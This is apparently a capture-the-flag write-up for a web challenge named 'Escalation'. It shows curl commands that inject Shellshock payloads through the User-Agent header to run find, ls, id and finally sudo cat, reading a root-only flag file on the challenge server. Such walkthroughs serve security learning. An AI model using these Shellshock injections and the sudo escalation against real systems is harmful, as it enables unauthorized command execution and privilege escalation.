# Escalation

- **Category**: Web
- **Appearance conditions**: after solve Challenge `2014-6271`. 
- **Solution**: privillege escalation with inproper sudo command.

---
| Step | Screenshot |
|------|------------|
|1. Open the challenge and found the message *Do you find rootflag?*|<img width="505" height="241" alt="image" src="https://github.com/user-attachments/assets/fa0c75a4-4f1d-4ea6-b371-18752414068e" />|
|2. Try `find` *rootflag* in this server following the command.<br>`curl  -A "(){ :;}; /usr/bin/find / -type f -name *rootflag* 2>/dev/null " -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>Then found the *rootflag*.|<img width="826" height="358" alt="image" src="https://github.com/user-attachments/assets/d9f4c694-d18d-4d2a-abd2-3e7a8f172c48" />|
|3. Try show the file permission following the command.<br>`curl  -A "(){ :;}; /usr/bin/ls -la /tmp/hidden/access_denied/busted/rootflag.txt" -b "your_session_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>You are need root permission to read this file.<br>First, look at login user now, command `id`<br>`curl -A "(){ :; }; /usr/bin/id " -b "session=your_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br>It seem www-data, www-data is low privilleged user. |<img width="1888" height="764" alt="image" src="https://github.com/user-attachments/assets/6f6ed8e6-fa1d-4803-936f-8a6d8134099d" />|
|4. How to get root permission?<br>Though, there are many way to get root permission, This time, inspect [sudo](https://linuc.org/study/column/4047/). `sudo` is we should investigate first because it is relatively easy way to escalate permission. ||
|5. Try `sudo -l` command. option `-l` is display allowed programs with root privilleged to ordinary users.<br>/usr/bin/cat is allowed.|<img width="1897" height="914" alt="image" src="https://github.com/user-attachments/assets/806ddcc7-af5c-48d6-8692-98418e7784ee" />|
|6. Now that, read *rootflag* with `cat` command with `sudo`.<br>`curl -A "(){ :; }; /usr/bin/sudo /usr/bin/cat /tmp/hidden/access_denied/busted/rootflag.txt" -b "sessio
n=your_cookie" https://nctf.xvps.jp/ntsettings/vuln.sh`<br><br>🎊 Congratulations!|<img width="1878" height="750" alt="image" src="https://github.com/user-attachments/assets/3df56fce-ccd6-4f42-83c6-2661eba4f3ff" />|
